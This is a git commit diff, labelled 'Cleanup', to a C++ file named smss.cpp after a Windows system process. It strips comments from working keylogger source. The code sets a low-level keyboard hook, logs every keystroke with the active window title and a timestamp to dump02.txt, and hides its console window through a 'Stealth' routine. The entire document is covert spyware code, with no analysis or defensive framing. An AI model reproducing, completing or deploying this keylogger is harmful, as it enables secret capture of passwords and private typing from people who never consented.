9331c1e54c3287b15e58b404be01e8fd68ef6574
Luke <39099814+CVFireDragon@users.noreply.github.com>
2018-12-07 21:22:13 -0500

    Cleanup

--- smss.cpp
+++ smss.cpp
@@ -6,12 +6,8 @@
 
 #define invisible
 
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
 HHOOK _hook;
 
-// This struct contains the data received by the hook callback. As you see in the callback function
-// it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
@@ -19,33 +15,27 @@ std::ofstream OUTPUT_FILE;
 
 extern char lastwindow[256];
 
-// This is the callback function. Consider it the event that is raised when, in this case, 
-// a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0)
 	{
-		// the action is valid: HC_ACTION.
+
 		if (wParam == WM_KEYDOWN)
 		{
-			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 			
-			// save to file
+
 			Save(kbdStruct.vkCode);
 		}
 	}
 
-	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
 void SetHook()
 {
-	// Set the hook and set it to use the callback function above
-	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
 		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
@@ -62,13 +52,13 @@ int Save(int key_stroke)
     char lastwindow[256];
     
 	if ((key_stroke == 1) || (key_stroke == 2))
-		return 0; // ignore mouse clicks
+		return 0; 
 	
 	HWND foreground = GetForegroundWindow();
     DWORD threadID;
     HKL layout;
     if (foreground) {
-        //get keyboard layout of the thread
+        
         threadID = GetWindowThreadProcessId(foreground, NULL);
         layout = GetKeyboardLayout(threadID);
     }
@@ -81,7 +71,6 @@ int Save(int key_stroke)
         if(strcmp(window_title, lastwindow)!=0) {
             strcpy(lastwindow, window_title);
             
-            // get time
             time_t t = time(NULL);
             struct tm *tm = localtime(&t);
             char s[64];
@@ -128,22 +117,22 @@ int Save(int key_stroke)
 		OUTPUT_FILE << "[CAPSLOCK]";
 	else {
         char key;
-        // check caps lock
+		
         bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-        // check shift key
+        
         if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
             lowercase = !lowercase;   
         }
 
-        //map virtual key according to keyboard layout 
+        
         key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
         
-        //tolower converts it to lowercase properly
+        
         if (!lowercase) key = tolower(key);
 		OUTPUT_FILE <<  char(key);
     }
-	//instead of opening and closing file handlers every time, keep file open and flush.
+	
     OUTPUT_FILE.flush();
 	return 0;
 }
@@ -151,26 +140,23 @@ int Save(int key_stroke)
 void Stealth()
 {
 	#ifdef visible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-	#endif // visible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
+	#endif
 
 	#ifdef invisible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-	#endif // invisible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+	#endif
 }
 
 int main()
 {
-	//open output file in append mode
+	
     OUTPUT_FILE.open("dump02.txt",std::ios_base::app);	
-
-	// visibility of window
+	
 	Stealth();
 
-	// Set the hook
 	SetHook();
 
-	// loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
